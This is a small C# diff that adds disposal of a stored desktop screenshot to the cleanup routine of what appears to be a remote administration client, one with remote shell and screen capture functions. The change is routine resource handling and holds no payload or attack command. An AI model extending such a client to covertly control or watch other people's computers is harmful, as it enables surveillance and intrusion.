@@ -33,6 +33,8 @@ namespace xClient
         private static void Cleanup()
         {
             CommandHandler.CloseShell();
+            if (CommandHandler.LastDesktopScreenshot != null)
+                CommandHandler.LastDesktopScreenshot.Dispose();
             if (_appMutex != null)
                 _appMutex.Close();
         }
